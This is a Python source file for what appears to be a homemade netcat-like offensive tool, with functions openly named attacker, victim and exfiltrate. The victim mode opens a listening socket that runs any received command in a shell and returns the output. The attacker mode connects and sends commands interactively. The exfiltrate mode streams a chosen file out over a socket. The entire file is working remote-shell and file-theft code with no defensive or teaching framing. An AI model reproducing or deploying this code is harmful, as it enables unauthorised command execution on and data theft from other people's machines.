import socket
import subprocess
import os
import sys
from getopt import getopt
from threading import Thread
import time

IP = "127.0.0.1"
PORT = 1234
LISTEN = False
EXFILTRATE = ""

def init_socket():
    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    return s

def attacker_snd(attacker_socket):
    try:
        while True:
            time.sleep(0.1)
            command = input()
            if command == "exit":
                break
            attacker_socket.send(command.encode())
    except Exception:
        attacker_socket.close()
    finally:
        attacker_socket.close()

def attacker_rcv(attacker_socket):
    try:
        while True:
            result = attacker_socket.recv(4096).decode()
            if result == "":
                break
            print(result,end='')
    except Exception:
        attacker_socket.close()
    finally:
        attacker_socket.close()


def attacker():
    try:
        attacker_socket = init_socket()
        attacker_socket.connect((IP,PORT))
    except Exception:
        exit(print("Cannot connect to the specified target !\n"))

    snd_thread = Thread(target=attacker_snd,args=(attacker_socket,))
    rcv_thread = Thread(target=attacker_rcv,args=(attacker_socket,))
    snd_thread.start()
    rcv_thread.start()
    rcv_thread.join()
    snd_thread.join()

def victim():
    victim_socket = init_socket()

    victim_socket.bind((IP,PORT))
    victim_socket.listen(1)

    victim_connection, _ = victim_socket.accept()

    try:
        while True:
            # exception for macOS 
            if sys.platform.startswith("win"):
                child_process_cwd = subprocess.Popen("echo %cd%", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            elif sys.platform == 'linux':
                child_process_cwd = subprocess.Popen("pwd", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            output, _ = child_process_cwd.communicate()
            victim_connection.send(output.rstrip() + b'> ')

            command = victim_connection.recv(4096).decode()

            if command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except Exception:
                    victim_connection.send("Invalid directory".encode())
                continue

            child_process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = child_process.communicate()

            if output != b'':
                victim_connection.send(output)
            else:
                victim_connection.send(error)

    except Exception as e:
        victim_connection.close()
        victim_socket.close()

def exfiltrate():
    s = init_socket()
    if LISTEN:
        s.bind((IP,PORT))
        s.listen(1)
        con, _ = s.accept()

        if not os.path.exists(EXFILTRATE):
            exit(print("File not exists!"))
        elif os.path.isdir(EXFILTRATE):
            exit(print("Cannot exfiltrate a directory!"))

        file_target = open(EXFILTRATE, "rb")
        while True:
            p = file_target.read(4096)
            con.send(p)
            if p == b'':
                break
        
        con.close()

    else:
        s.connect((IP,PORT))

        file_pointer = open(EXFILTRATE,"wb")
        
        file_rcv = s.recv(4096)
        while file_rcv:
            file_pointer.write(file_rcv)
            file_rcv = s.recv(4096)
        
        s.close()
    
    print("Exfiltration of %s file completed!"%(EXFILTRATE))

def info():
    print("Help menu here...")
    print("Figure it yourself...")

def process():
    callback = [exfiltrate, victim, attacker]
    mode = -1
    if EXFILTRATE != "":
        mode = 0
    elif LISTEN:
        mode = 1
    else:
        mode = 2
    exit(callback[mode]())
    
def main():
    global IP, PORT, LISTEN, EXFILTRATE
    args, _ = getopt(sys.argv[1:],"i:p:le:h",["ip","port","listen","exfiltrate","help"])
    for key, value in args:
        if key in ['-h','--help']:
            exit(info())
        elif key in ['-i','--ip']:
            IP = value
        elif key in ['-p','--port']:
            PORT = int(value)
        elif key in ['-l','--listen']:
            LISTEN = True
        elif key in ['-e','--exfiltrate']:
            EXFILTRATE = value

    process()

if __name__ == "__main__":
    main()